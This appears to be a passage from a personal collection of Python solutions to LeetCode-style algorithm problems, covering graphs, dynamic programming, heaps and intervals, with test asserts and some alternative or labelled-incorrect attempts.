for p, q in edges:
ds.add(p)
ds.add(q)
if ds.is_union(p, q):
return [p, q]
ds.unionize(p, q)
raise
class Solution_dfs:
def findRedundantConnection(self, edges: List[List[int]]) -> List[int]:
G = defaultdict(set)
for p, q in edges:
G[p].add(q)
G[q].add(p)
visited = set()
for k in G.keys():
if k not in visited:
circle = self.dfs(G, k, None, set([k]), [k], visited)
if circle:
for p, q in reversed(edges):
if p in circle and q in circle:
return [p, q]
raise
def dfs(self, G, cur, pi, path, path_list, visited):
visited.add(cur)
for nbr in G[cur]:
if nbr != pi:
if nbr in path:
circle = set()
in_circle = False
for e in path_list:
if e == nbr:
in_circle = True
if in_circle:
circle.add(e)
return circle
path.add(nbr)
path_list.append(nbr)
circle = self.dfs(G, nbr, cur, path, path_list, visited)
if circle:
return circle
path.remove(nbr)
path_list.pop()
return None
if __name__ == "__main__":
assert Solution().findRedundantConnection([[1,2], [1,3], [2,3]]) == [2, 3]
assert Solution().findRedundantConnection([[1,2], [2,3], [3,4], [1,4], [1,5]]) == [1, 4]
assert Solution().findRedundantConnection([[30,44],[34,47],[22,32],[35,44],[26,36],[2,15],[38,41],[28,35],[24,37],[14,49],[44,45],[11,50],[20,39],[7,39],[19,22],[3,17],[15,25],[1,39],[26,40],[5,14],[6,23],[5,6],[31,48],[13,22],[41,44],[10,19],[12,41],[1,12],[3,14],[40,50],[19,37],[16,26],[7,25],[22,33],[21,27],[9,50],[24,42],[43,46],[21,47],[29,40],[31,34],[9,31],[14,31],[5,48],[3,18],[4,19],[8,17],[38,46],[35,37],[17,43]]) == [5,48]
import math
class Solution:
def repeatedStringMatch(self, A, B):
r = math.ceil(len(B) / len(A))
for count in (r, r + 1):
if B in A * count:
return count
return -1
def repeatedStringMatch_TLE(self, A: str, B: str) -> int:
for i in range(len(A)):
j = 0
count = 0
while j < len(B):
if i + j - count * len(A) >= len(A):
count += 1
idx = i + j - count * len(A)
if A[idx] == B[j]:
j += 1
else:
break
if j == len(B):
return count + 1
return -1
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.ret = 0
def longestUnivaluePath(self, root: TreeNode) -> int:
self.find(root)
return self.ret
def find(self, node):
if not node:
return 0
left = self.find(node.left)
right = self.find(node.right)
left_path = left + 1 if node.left and node.left.val == node.val else 0
right_path = right + 1 if node.right and node.right.val == node.val else 0
self.ret = max(self.ret, left_path + right_path)
return max(left_path, right_path)
class Solution_error:
def __init__(self):
self.ret = 0
def longestUnivaluePath(self, root: TreeNode) -> int:
self.find(root)
return self.ret
def find(self, node):
if not node:
return 0
left = self.find(node.left)
right = self.find(node.right)
cur = 1
path = 1
if left and node.left.val == node.val:
path += left
cur = left + 1
if right and node.right.val == node.val:
path += right
if right > left:
cur = right + 1
self.ret = max(self.ret, path - 1)
return cur
dirs = (
(-1, -2),
(-1, 2),
(1, -2),
(1, 2),
(-2, -1),
(-2, 1),
(2, -1),
(2, 1),
)
class Solution:
def knightProbability(self, N: int, K: int, r: int, c: int) -> float:
q = set([(r, c)])
P = [[0 for _ in range(N)] for _ in range(N)]
P[r][c] = 1
k = 0
while k < K:
k += 1
cur_q = set()
cur_P = [[0 for _ in range(N)] for _ in range(N)]
for i, j in q:
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < N and 0 <= J < N:
cur_q.add((I, J))
cur_P[I][J] += P[i][j] * 1 / 8
q = cur_q
P = cur_P
return sum([
P[i][j]
for i in range(N)
for j in range(N)
])
def knightProbability_error(self, N: int, K: int, r: int, c: int) -> float:
q = [(r, c)]
P = [[0 for _ in range(N)] for _ in range(N)]
P[r][c] = 1
k = 0
while k < K:
k += 1
cur_q = []
cur_P = [[0 for _ in range(N)] for _ in range(N)]
for i, j in q:
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < N and 0 <= J < N:
cur_q.append((I, J))
cur_P[I][J] += P[i][j] * 1 / 8
q = cur_q
P = cur_P
return sum([
P[i][j]
for i in range(N)
for j in range(N)
])
if __name__ == "__main__":
assert Solution().knightProbability(3, 2, 0, 0)  == 0.0625
assert Solution().knightProbability(3, 3, 0, 0)  == 0.015625
import heapq
from collections import defaultdict
from typing import List
class Word:
def __init__(self, content, count):
self.content = content
self.count = count
def __lt__(self, other):
if self.count == other.count:
return self.content > other.content
return self.count < other.count
class Solution:
def topKFrequent(self, words: List[str], k: int) -> List[str]:
h = []
counter = defaultdict(int)
for w in words:
counter[w] += 1
for w, c in counter.items():
heapq.heappush(h, Word(w, c))
if len(h) > k:
heapq.heappop(h)
ret = []
while h:
w = heapq.heappop(h).content
ret.append(w)
return ret[::-1]
if __name__ == "__main__":
assert Solution().topKFrequent(["i", "love", "leetcode", "i", "love", "coding"], 2)
class Solution:
def hasAlternatingBits(self, n: int) -> bool:
last = None
while n:
cur = n & 1
if last is not None and last ^ cur == 0:
return False
last = cur
n >>= 1
return True
if __name__ == "__main__":
assert Solution().hasAlternatingBits(5) == True
assert Solution().hasAlternatingBits(7) == False
from typing import List
dirs = ((0, -1), (0, 1), (-1, 0), (1, 0))
class Solution:
def maxAreaOfIsland(self, grid: List[List[int]]) -> int:
if not grid:
return 0
ret = 0
m, n = len(grid), len(grid[0])
visited = [[False for _ in range(n)] for _ in range(m)]
for i in range(m):
for j in range(n):
if not visited[i][j] and grid[i][j] == 1:
ret = max(ret, self.dfs(grid, i, j, visited))
return ret
def dfs(self, grid, i, j, visited) -> int:
visited[i][j] = True
ret = 1
m, n = len(grid), len(grid[0])
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n and not visited[I][J] and grid[I][J] == 1:
ret += self.dfs(grid, I, J, visited)
return ret
if __name__ == "__main__":
grid = [[0,0,1,0,0,0,0,1,0,0,0,0,0],
[0,0,0,0,0,0,0,1,1,1,0,0,0],
[0,1,1,0,1,0,0,0,0,0,0,0,0],
[0,1,0,0,1,1,0,0,1,0,1,0,0],
[0,1,0,0,1,1,0,0,1,1,1,0,0],
[0,0,0,0,0,0,0,0,0,0,1,0,0],
[0,0,0,0,0,0,0,1,1,1,0,0,0],
[0,0,0,0,0,0,0,1,1,0,0,0,0]]
assert Solution().maxAreaOfIsland(grid) == 6
class Solution:
def countBinarySubstrings(self, s: str) -> int:
cur = 1
prev = 0
ret = 0
for i in range(1, len(s)):
if s[i] == s[i-1]:
cur += 1
else:
prev = cur
cur = 1
if prev >= cur:
ret += 1
return ret
def countBinarySubstrings_error(self, s: str) -> int:
counter = {"0": 0, "1": 0}
ret = 0
if not s:
return ret
counter[s[0]] += 1
for i in range(1, len(s)):
if s[i] != s[i-1] and counter[s[i]] != 0:
counter[s[i]] = 0
counter[s[i]] += 1
if min(counter["0"], counter["1"]) > 0:
ret += 1
return ret
if __name__ == "__main__":
assert Solution().countBinarySubstrings("00110011") == 6
assert Solution().countBinarySubstrings("00110") == 3
from typing import List
from collections import defaultdict
class Solution:
def findShortestSubArray(self, nums: List[int]) -> int:
if not nums:
return
counter = defaultdict(int)
first = {}
mx = [0, 0]
for i, n in enumerate(nums):
if n not in first:
first[n] = i
counter[n] += 1
if counter[n] > mx[0]:
mx = [counter[n], i - first[n] + 1]
elif counter[n] == mx[0]:
mx[1] = min(mx[1], i - first[n] + 1)
return mx[1]
if __name__ == "__main__":
assert Solution().findShortestSubArray([1, 2, 2, 3, 1]) == 2
from typing import List
class Solution:
def canPartitionKSubsets(self, nums: List[int], k: int) -> bool:
s = sum(nums)
if s % k != 0:
return False
target = s // k
visited = [False for _ in nums]
return self.dfs(nums, 0, None, target, visited, k)
def dfs(self, nums, start_idx, cur_sum, target_sum, visited, k):
if k == 1:
return True
if cur_sum and cur_sum == target_sum:
return self.dfs(nums, 0, None, target_sum, visited, k - 1)
for i in range(start_idx, len(nums)):
if not visited[i]:
visited[i] = True
nxt_sum = (cur_sum or 0) + nums[i]
if self.dfs(nums, i + 1, nxt_sum, target_sum, visited, k):
return True
visited[i] = False
return False
class Solution_TLE:
def canPartitionKSubsets(self, nums: List[int], k: int) -> bool:
s = sum(nums)
if s % k != 0:
return False
target = s // k
visited = [False for _ in nums]
return self.dfs(nums, None, target, visited, k)
def dfs(self, nums, cur_sum, target_sum, visited, k):
if k == 0:
return True
if cur_sum and cur_sum == target_sum:
return self.dfs(nums, None, target_sum, visited, k - 1)
for i in range(len(nums)):
if not visited[i]:
visited[i] = True
nxt_sum = (cur_sum or 0) + nums[i]
if self.dfs(nums, nxt_sum, target_sum, visited, k):
return True
visited[i] = False
return False
if __name__ == "__main__":
assert Solution().canPartitionKSubsets([5, 3, 2, 3, 1, 2, 4], 4) == True
assert Solution().canPartitionKSubsets([4, 3, 2, 3, 5, 2, 1], 4) == True
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def searchBST(self, root: TreeNode, val: int) -> TreeNode:
if not root:
return None
if root.val == val:
return root
elif root.val < val:
return self.searchBST(root.right, val)
else:
return self.searchBST(root.left, val)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def insertIntoBST(self, root: TreeNode, val: int) -> TreeNode:
if not root:
return TreeNode(val)
if root.val < val:
root.right = self.insertIntoBST(root.right, val)
elif root.val > val:
root.left = self.insertIntoBST(root.left, val)
else:
raise
return root
from typing import List
import heapq
class KthLargest:
def __init__(self, k: int, nums: List[int]):
self.h = []
self.k = k
for n in nums:
self.add(n)
def add(self, val: int) -> int:
heapq.heappush(self.h, val)
if len(self.h) > self.k:
heapq.heappop(self.h)
return self.h[0]
from typing import List
class Solution:
def search(self, nums: List[int], target: int) -> int:
lo = 0
hi = len(nums)
while lo < hi:
mid = (lo + hi) // 2
if nums[mid] == target:
return mid
elif nums[mid] < target:
lo = mid + 1
else:
hi = mid
return -1
class Solution:
def minimumDeleteSum(self, s1: str, s2: str) -> int:
m, n = len(s1), len(s2)
F = [[float('inf') for _ in range(n + 1)] for _ in range(m + 1)]
F[0][0] = 0
for i in range(1, m + 1):
F[i][0] = F[i-1][0] + ord(s1[i-1])
for j in range(1, n + 1):
F[0][j] = F[0][j-1] + ord(s2[j-1])
for i in range(1, m + 1):
for j in range(1, n + 1):
F[i][j] = min(
F[i][j],
F[i][j-1] + ord(s2[j-1]),
F[i-1][j] + ord(s1[i-1]),
)
if s1[i-1] == s2[j-1]:
F[i][j] = min(
F[i][j],
F[i-1][j-1],
)
return F[m][n]
def minimumDeleteSum_error(self, s1: str, s2: str) -> int:
m, n = len(s1), len(s2)
F = [[float('inf') for _ in range(n + 1)] for _ in range(m + 1)]
F[0][0] = 0
F[1][0] = ord(s1[0])
F[0][1] = ord(s2[0])
for i in range(1, m + 1):
for j in range(1, n + 1):
F[i][j] = min(
F[i][j],
F[i][j-1] + ord(s2[j-1]),
F[i-1][j] + ord(s1[i-1]),
)
if s1[i-1] == s2[j-1]:
F[i][j] = min(
F[i][j],
F[i-1][j-1],
)
return F[m][n]
if __name__ == "__main__":
assert Solution().minimumDeleteSum("sea", "eat") == 231
assert Solution().minimumDeleteSum("delete", "leet") == 403
from typing import List
class Solution:
def numSubarrayProductLessThanK(self, nums: List[int], k: int) -> int:
i = 0
ret = 0
p = 1
for j in range(len(nums)):
p *= nums[j]
while p >= k and i <= j:
p //= nums[i]
i += 1
ret += j - i + 1
return ret
from typing import List
from collections import defaultdict
class Solution:
def findLength(self, A: List[int], B: List[int]) -> int:
m, n = len(A), len(B)
F = defaultdict(lambda: defaultdict(int))
for i in range(1, m+1):
for j in range(1, n+1):
if A[i-1] == B[j-1]:
F[i][j] = F[i-1][j-1] + 1
return max(
F[i][j]
for i in range(1, m+1)
for j in range(1, n+1)
)
if __name__ == "__main__":
assert Solution().findLength([1,2,3,2,1], [3,2,1,4,7]) == 3
from collections import defaultdict
class Solution:
def accountsMerge(self, accounts: List[List[str]]) -> List[List[str]]:
email_to_ids = defaultdict(set)
for i, v in enumerate(accounts):
for email in v[1:]:
email_to_ids[email].add(i)
visited = [False for _ in accounts]
ret = []
for i, v in enumerate(accounts):
if not visited[i]:
emails = set()
self.dfs(i, accounts, email_to_ids, emails, visited)
ret.append([v[0]] + sorted(emails))
return ret
def dfs(self, i, accounts, email_to_ids, emails, visited):
visited[i] = True
for email in accounts[i][1:]:
emails.add(email)
for nbr in email_to_ids[email]:
if not visited[nbr]:
self.dfs(nbr, accounts, email_to_ids, emails, visited)
def accountsMerge_error(self, accounts: List[List[str]]) -> List[List[str]]:
email_id = {}
id_emails = defaultdict(list)
for i in range(len(accounts)):
person = None
for email in accounts[i][1:]:
if email in email_id:
person = email_id[email]
break
for email in accounts[i][1:]:
if person is None:
person = i
email_id[email] = person
id_emails[person].append(email)
elif email not in email_id:
email_id[email] = person
id_emails[person].append(email)
ret = []
for k, v in id_emails.items():
ret.append([accounts[k][0]] + sorted(v))
return ret
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
import math
class Solution:
def splitListToParts(self, root: ListNode, k: int) -> List[ListNode]:
l = 0
node = root
while node:
l += 1
node = node.next
ret = [[] for _ in range(k)]
short_chunk_l = l // k
long_chunk_l = short_chunk_l + 1
n_long_chunk = l % k
n_short_chunk = l - n_long_chunk
chunk_counter = 0
cur_l = 0
node = root
while node:
ret[chunk_counter].append(node.val)
cur_l += 1
chunk_size = long_chunk_l if chunk_counter < n_long_chunk else short_chunk_l
if cur_l == chunk_size:
cur_l = 0
chunk_counter += 1
node = node.next
return ret
def splitListToParts_2(self, root: ListNode, k: int) -> List[ListNode]:
l = 0
node = root
while node:
l += 1
node = node.next
ret = [[] for _ in range(k)]
node = root
counter = 0
cur_l = 0
i = 0
part_l = math.ceil((l - counter) / k)
while node:
cur_l += 1
counter += 1
ret[i].append(node.val)
if cur_l == part_l:
k -= 1
cur_l = 0
i += 1
if k != 0:
part_l = math.ceil((l - counter) / k)
node = node.next
return ret
def splitListToParts_error(self, root: ListNode, k: int) -> List[ListNode]:
l = 0
node = root
while node:
l += 1
node = node.next
part_l = math.ceil(l / k)
ret = [[] for _ in range(k)]
node = root
cur_l = 0
i = 0
while node:
cur_l += 1
ret[i].append(node.val)
if cur_l == part_l:
cur_l = 0
i += 1
node = node.next
return ret
class Node:
def __init__(self, s, e):
self.s = s
self.e = e
self.left = None
self.right = None
class MyCalendar:
def __init__(self):
self.root = None
def insert(self, node: Node, s: int, e: int) -> Node:
if not node:
return Node(s, e)
if e <= node.s:
left = self.insert(node.left, s, e)
if left is None:
return None
node.left = left
return node
elif s >= node.e:
right = self.insert(node.right, s, e)
if right is None:
return None
node.right = right
return node
else:
return None
def book(self, start: int, end: int) -> bool:
ret = self.insert(self.root, start, end)
if ret is None:
return False
self.root = ret
return True
import bisect
class MyCalendarTwo:
def __init__(self):
self.lst = []
def book(self, start: int, end: int) -> bool:
bisect.insort(self.lst, (start, "start"))
bisect.insort(self.lst, (end, "end"))
count = 0
for _, flag in self.lst:
count += 1 if flag == "start" else -1
if count > 2:
self.lst.remove((start, "start"))
self.lst.remove((end, "end"))
return False
return True
import bisect
class MyCalendarThree:
def __init__(self):
self.lst = []
def book(self, start: int, end: int) -> int:
bisect.insort(self.lst, (start, "start"))
bisect.insort(self.lst, (end, "end"))
ret = 0
count = 0
for _, flag in self.lst:
count += 1 if flag == "start" else -1
ret = max(ret, count)
return ret
from typing import List
dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))
class Solution:
def floodFill(self, image: List[List[int]], sr: int, sc: int, newColor: int) -> List[List[int]]:
cur_color = image[sr][sc]
if cur_color == newColor:
return image
self.dfs(image, sr, sc, cur_color, newColor)
return image
def dfs(self, image, i, j, cur_color, new_color):
image[i][j] = new_color
m, n = len(image), len(image[0])
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n and image[I][J] == cur_color:
self.dfs(image, I, J, cur_color, new_color)
from typing import List
class Solution:
def asteroidCollision(self, asteroids: List[int]) -> List[int]:
stk = []
for e in asteroids:
while stk and e < 0 < stk[-1]:
if abs(e) > abs(stk[-1]):
stk.pop()
elif abs(e) == abs(stk[-1]):
stk.pop()
break
else:
break
else:
stk.append(e)
return stk
def asteroidCollision_complex(self, asteroids: List[int]) -> List[int]:
stk = []
n = len(asteroids)
for i in range(n-1, -1, -1):
cur = asteroids[i]
while stk and asteroids[stk[-1]] < 0 and cur > 0 and abs(asteroids[stk[-1]]) < abs(cur):
stk.pop()
if stk and cur > 0 and asteroids[stk[-1]] == -cur:
stk.pop()
continue
if not stk:
stk.append(i)
continue
if not (asteroids[stk[-1]] < 0 and cur > 0) or abs(cur) > abs(asteroids[stk[-1]]):
stk.append(i)
return [
asteroids[i]
for i in stk[::-1]
]
if __name__ == "__main__":
assert Solution().asteroidCollision([10, 2, -5]) == [10]
assert Solution().asteroidCollision([5, 10, -5]) == [5, 10]
assert Solution().asteroidCollision([8, -8]) == []
class Solution:
def monotoneIncreasingDigits(self, N: int) -> int:
digits = [int(e) for e in str(N)]
pointer = len(digits)
for i in range(len(digits) - 1, 0, -1):
if digits[i - 1] > digits[i]:
pointer = i
digits[i - 1] -= 1
for i in range(pointer, len(digits)):
digits[i] = 9
return int("".join(map(str, digits)))
if __name__ == "__main__":
assert Solution().monotoneIncreasingDigits(10) == 9
assert Solution().monotoneIncreasingDigits(332) == 299
from typing import List
from collections import deque
class Solution:
def dailyTemperatures(self, T: List[int]) -> List[int]:
ret = deque()
stk = []
for i in range(len(T) - 1, -1 , -1):
while stk and T[stk[-1]] <= T[i]:
stk.pop()
if stk:
ret.appendleft(stk[-1] - i)
else:
ret.appendleft(0)
stk.append(i)
return list(ret)
if __name__ == "__main__":
assert Solution().dailyTemperatures([73, 74, 75, 71, 69, 72, 76, 73]) == [1, 1, 4, 2, 1, 1, 0, 0]
from typing import List
from collections import defaultdict
class Solution:
def deleteAndEarn(self, nums: List[int]) -> int:
rewards = [0 for _ in range(10001)]
for num in nums:
rewards[num] += num
cur, prev = 0, 0
for reward in rewards:
nxt = max(cur, prev + reward)
prev = cur
cur = nxt
return cur
def deleteAndEarn_dp(self, nums: List[int]) -> int:
counter = defaultdict(int)
for n in nums:
counter[n] += 1
F = [0 for _ in range(10000 + 3)]
for i in range(3, 10000 + 3):
cur = i - 2
F[i] = max(
F[i-1],
F[i-2] + counter[cur] * cur
)
return F[-1]
def deleteAndEarn_slow(self, nums: List[int]) -> int:
nums.sort()
counter = []
i = 0
j = 0
while i < len(nums):
while j < len(nums) and nums[i] == nums[j]:
j += 1
counter.append((nums[i], j - i))
i = j
F = [0 for _ in counter]
for i in range(len(counter)):
F[i] = counter[i][0] * counter[i][1]
F[i] += max(
[
F[j]
for j in range(i)
if counter[j][0] != counter[i][0] - 1
]
or [0]
)
return max(F or [0])
if __name__ == "__main__":
assert Solution().deleteAndEarn([1,1,1,2,4,5,5,5,6]) == 18
assert Solution().deleteAndEarn([3, 4, 2]) == 6
assert Solution().deleteAndEarn([2, 2, 3, 3, 3, 4]) == 9
from typing import List
class Solution:
def __init__(self):
self.cache = {}
def cherryPickup(self, grid: List[List[int]]) -> int:
return max(0, self.F(grid, 0, 0, 0))
def F(self, grid, r1, c1, r2):
n = len(grid)
if (r1, c1, r2) not in self.cache:
ret = float("-inf")
c2 = r1 + c1 - r2
if 0 <= r1 < n and 0 <= c1 < n and 0 <= r2 < n and 0 <= c2 < n:
if grid[r1][c1] != -1 and grid[r2][c2] != -1:
ret = 0
ret += grid[r1][c1]
if r1 != r2:
ret += grid[r2][c2]
if r1 == n - 1 and c1 == n - 1:
pass
else:
ret += max(
self.F(grid, r1+1, c1, r2+1),
self.F(grid, r1+1, c1, r2),
self.F(grid, r1, c1+1, r2+1),
self.F(grid, r1, c1+1, r2),
)
self.cache[r1, c1, r2] = ret
return self.cache[r1, c1, r2]
if __name__ == "__main__":
assert Solution().cherryPickup(
[[0, 1, -1],
[1, 0, -1],
[1, 1,  1]]
) == 5
assert Solution().cherryPickup(
[[1, 1, -1],
[1, -1, 1],
[-1, 1, 1]]
) == 0
from typing import List
from collections import defaultdict
import heapq
class Solution:
def networkDelayTime(self, times: List[List[int]], N: int, K: int) -> int:
G = defaultdict(dict)
reach_time = [float('inf') for _ in range(N + 1)]
for u, v, w in times:
G[u][v] = w
h = [(0, K)]
reach_time[K] = 0
while h:
t, s = heapq.heappop(h)
if s in G:
for d, w in G[s].items():
if t + w < reach_time[d]:
reach_time[d] = t + w
heapq.heappush(h, (t + w, d))
ret = max(reach_time[1:])
if ret == float('inf'):
return -1
return ret
if __name__ == "__main__":
assert Solution().networkDelayTime([[2,1,1],[2,3,1],[3,4,1]], 4, 2) == 2
from typing import List
class Solution:
def minCostClimbingStairs(self, cost: List[int]) -> int:
n = len(cost)
F = [float('inf') for _ in range(n+1)]
F[0] = 0
F[1] = 0
for i in range(2, n+1):
F[i] = min(
F[i-2] + cost[i-2],
F[i-1] + cost[i-1]
)
return F[-1]
if __name__ == "__main__":
assert Solution().minCostClimbingStairs([10, 15, 20]) == 15
from typing import List
weights = [
24,
16,
8,
0,
]
class Solution:
def ipToCIDR(self, ip: str, n: int) -> List[str]:
num_ip = self.to_bin(ip)
ret = []
while n > 0:
lsb = self.get_lsb(num_ip)
while (1 << lsb) > n:
lsb -= 1
cur_cover = 1 << lsb
n -= cur_cover
ret.append(
self.to_ip(num_ip) + f"/{32-lsb}"
)
num_ip += cur_cover
return ret
def to_bin(self, ip):
ret = 0
for n, w in zip(map(int, ip.split(".")), weights):
ret += n << w
return ret
def to_ip(self, bin):
ret = []
for w in weights:
ret.append(
(bin >> w) & 255
)
return ".".join(map(str, ret))
def get_lsb(self, n):
lsb = 0
while (n >> lsb) & 1 == 0:
lsb += 1
return lsb
if __name__ == "__main__":
assert Solution().ipToCIDR("60.166.253.147", 12) == ["60.166.253.147/32","60.166.253.148/30","60.166.253.152/30","60.166.253.156/31","60.166.253.158/32"]
assert Solution().ipToCIDR("255.0.0.7", 10) == ["255.0.0.7/32","255.0.0.8/29","255.0.0.16/32"]
from typing import List
class Solution:
def openLock(self, deadends: List[str], target: str) -> int:
destination = tuple(int(c) for c in target)
deadends_set = set(
tuple(int(c) for c in s)
for s in deadends
)
q = [(0, 0, 0, 0)]
if q[0] in deadends_set:
return -1
step = 0
visited = set(q)
while q:
cur_q = []
for e in q:
if e == destination:
return step
for i in range(4):
for delta in (-1, 1):
nxt_lst = list(e)
nxt_lst[i] = (nxt_lst[i] + delta) % 10
nxt = tuple(nxt_lst)
if nxt not in visited and nxt not in deadends_set:
visited.add(nxt)
cur_q.append(nxt)
step += 1
q = cur_q
return -1
if __name__ == "__main__":
assert Solution().openLock(["8888"], "0009") == 1
assert Solution().openLock(["8887","8889","8878","8898","8788","8988","7888","9888"], "8888") == -1
class Solution:
def reachNumber(self, target: int) -> int:
target = abs(target)
s = 0
k = 0
while s < target:
k += 1
s += k
delta = s - target
if delta % 2 == 0:
return k
else:
if (k + 1) % 2 == 1:
return k + 1
else:
return k + 2
from typing import List
class Solution:
def pourWater(self, heights: List[int], V: int, K: int) -> List[int]:
for _ in range(V):
s = K
optimal = s
for i in range(s-1, -1, -1):
if heights[i] <= heights[i+1]:
if heights[i] < heights[optimal]:
optimal = i
else:
break
if optimal == s:
for i in range(s+1, len(heights)):
if heights[i] <= heights[i-1]:
if heights[i] < heights[optimal]:
optimal = i
else:
break
heights[optimal] += 1
return heights
if __name__ == "__main__":
assert Solution().pourWater([2,1,1,2,1,2,2], 4, 3) == [2,2,2,3,2,2,2]
import itertools
from typing import List
from collections import defaultdict
class Solution:
def pyramidTransition(self, bottom: str, allowed: List[str]) -> bool:
T = defaultdict(set)
for a, b, c in allowed:
T[a, b].add(c)
return self.dfs(T, bottom)
def dfs(self, T, level) -> bool:
if len(level) == 1:
return True
for nxt_level in itertools.product(
*[T[a, b] for a, b in zip(level, level[1:])]
):
if self.dfs(T, nxt_level):
return True
return False
def gen_nxt_level(self, T, level, lo):
if lo + 1 >= len(level):
yield ""
return
for head in T[level[lo], level[lo + 1]]:
for tail in self.gen_nxt_level(T, level, lo + 1):
yield head + tail
def dfs_deep(self, T, level, lo, nxt_level) -> bool:
if lo + 1 == len(level):
return True
for nxt in T[level[lo], level[lo + 1]]:
nxt_level.append(nxt)
if self.dfs(T, level, lo + 1, nxt_level):
if self.dfs(T, nxt_level, 0, []):
return True
nxt_level.pop()
return False
if __name__ == "__main__":
assert Solution().pyramidTransition("BCD", ["BCG", "CDE", "GEA", "FFF"]) == True
assert Solution().pyramidTransition("AABA", ["AAA", "AAB", "ABA", "ABB", "BAC"]) == False
from typing import List
import heapq
S = 0
E = 1
class Solution:
def employeeFreeTime(self, schedule: List[List[List[int]]]) -> List[List[int]]:
cur_max_end = min(
itv[E]
for itvs in schedule
for itv in itvs
)
q = []
for i, itvs in enumerate(schedule):
j = 0
itv = itvs[j]
heapq.heappush(q, (itv[S], i, j))
ret = []
while q:
_, i, j = heapq.heappop(q)
itv = schedule[i][j]
if cur_max_end < itv[S]:
ret.append([cur_max_end, itv[S]])
cur_max_end = max(cur_max_end, itv[E])
j += 1
if j < len(schedule[i]):
itv = schedule[i][j]
heapq.heappush(q, (itv[S], i, j))
return ret
def employeeFreeTime(self, schedule: List[List[List[int]]]) -> List[List[int]]:
lst = []
for itvs in schedule:
for itv in itvs:
lst.append([itv[S], S])
lst.append([itv[E], E])
lst.sort()
count = 0
prev = None
ret = []
for t, flag in lst:
if count == 0 and prev:
ret.append([prev, t])
if flag == S:
count += 1
else:
prev = t
count -= 1
return ret
def employeeFreeTime_error(self, schedule: List[List[List[int]]]) -> List[List[int]]:
schedules = list(map(iter, schedule))
cur_max_end = min(
itv[E]
for emp in schedule
for itv in emp
)
q = []
for emp_iter in schedules:
itv = next(emp_iter, None)
if itv:
heapq.heappush(q, (itv[S], itv, emp_iter))
ret = []
while q:
_, itv, emp_iter = heapq.heappop(q)
if cur_max_end < itv[S]:
ret.append([cur_max_end, itv[S]])
cur_max_end = max(cur_max_end, itv[E])
itv = next(emp_iter, None)
if itv:
heapq.heappush(q, (itv[S], itv, emp_iter))
return ret
if __name__ == "__main__":
assert Solution().employeeFreeTime([[[1,2],[5,6]],[[1,3]],[[4,10]]]) == [[3,4]]
assert Solution().employeeFreeTime([[[4,16],[31,36],[42,50],[80,83],[95,96]],[[4,13],[14,19],[37,53],[64,66],[85,89]],[[17,24],[38,39],[49,51],[62,67],[79,81]],[[9,15],[17,24],[45,63],[65,68],[87,88]],[[17,33],[39,41],[43,57],[58,63],[70,84]]]) == [[36, 37], [68, 70], [84, 85], [89, 95]]
from typing import List
class Solution:
def partitionLabels(self, S: str) -> List[int]:
lasts = {}
n = len(S)
for i in range(n-1, -1, -1):
if S[i] not in lasts:
lasts[S[i]] = i
indexes = [-1]
cur_last = 0
for i in range(n):
cur_last = max(cur_last, lasts[S[i]])
if cur_last == i:
indexes.append(cur_last)
ret = []
for i in range(len(indexes) - 1):
ret.append(indexes[i+1] - indexes[i])
return ret
if __name__ == "__main__":
assert Solution().partitionLabels("ababcbacadefegdehijhklij") == [9, 7, 8]
from typing import List
class Solution:
def orderOfLargestPlusSign(self, N: int, mines: List[List[int]]) -> int:
G = [[1 for _ in range(N)] for _ in range(N)]
for i, j in mines:
G[i][j] = 0
F = [[[G[i][j] for _ in range(4)] for j in range(N)] for i in range(N)]
for i in range(N):
for j in range(N):
if j - 1 >= 0 and G[i][j] == 1:
F[i][j][0] = F[i][j-1][0] + 1
if i - 1 >= 0 and G[i][j] == 1:
F[i][j][1] = F[i-1][j][1] + 1
for i in range(N-1, -1, -1):
for j in range(N-1, -1, -1):
if j + 1 < N and G[i][j] == 1:
F[i][j][2] = F[i][j+1][2] + 1
if i + 1 < N and G[i][j] == 1:
F[i][j][3] = F[i+1][j][3] + 1
ret = 0
for i in range(N):
for j in range(N):
ret = max(ret, min(F[i][j]))
return ret
if __name__ == "__main__":
assert Solution().orderOfLargestPlusSign(5, [[4, 2]]) == 2
from typing import List
class Solution:
def isToeplitzMatrix(self, matrix: List[List[int]]) -> bool:
m, n = len(matrix), len(matrix[0])
for i in range(1, m):
for j in range(1, n):
if matrix[i][j] != matrix[i-1][j-1]:
return False
return True
def isToeplitzMatrix_complex(self, matrix: List[List[int]]) -> bool:
m, n = len(matrix), len(matrix[0])
for j in range(n):
r = 0
c = j
cur = matrix[r][c]
while r < m and c < n:
if cur != matrix[r][c]:
return False
r += 1
c += 1
for i in range(1, m):
r = i
c = 0
cur = matrix[r][c]
while r < m and c < n:
if cur != matrix[r][c]:
return False
r += 1
c += 1
return True
from collections import defaultdict
class Solution:
def reorganizeString(self, S: str) -> str:
counter = defaultdict(int)
for c in S:
counter[c] += 1
lst = [
(-n, n, c)
for c, n in counter.items()
]
lst.sort()
piles = []
_, n, c = lst[0]
for i in range(n):
piles.append([c])
cnt = 0
for _, n, c in lst[1:]:
for _ in range(n):
piles[cnt].append(c)
cnt = (cnt + 1) % len(piles)
if len(piles) > 1 and len(piles[-2]) == 1:
return ""
return "".join(
map(lambda x: "".join(x), piles)
)
if __name__ == "__main__":
assert Solution().reorganizeString("vvvlo") == "vlvov"
assert Solution().reorganizeString("aab") == "aba"
assert Solution().reorganizeString("aaab") == ""
from typing import List
from collections import defaultdict, deque
class Solution:
def maxChunksToSorted(self, arr: List[int]) -> int:
A = sorted(arr)
hm = defaultdict(deque)
for i, e in enumerate(A):
hm[e].append(i)
proxy = []
for e in arr:
proxy.append(hm[e].popleft())
ret = 0
cur_max_idx = 0
for i, e in enumerate(proxy):
cur_max_idx = max(cur_max_idx, e)
if cur_max_idx == i:
ret += 1
return ret
from typing import List
class Solution:
def maxChunksToSorted(self, arr: List[int]) -> int:
ret = 0
cur_max_idx = 0
for i in range(len(arr)):
cur_max_idx = max(cur_max_idx, arr[i])
if i == cur_max_idx:
ret += 1
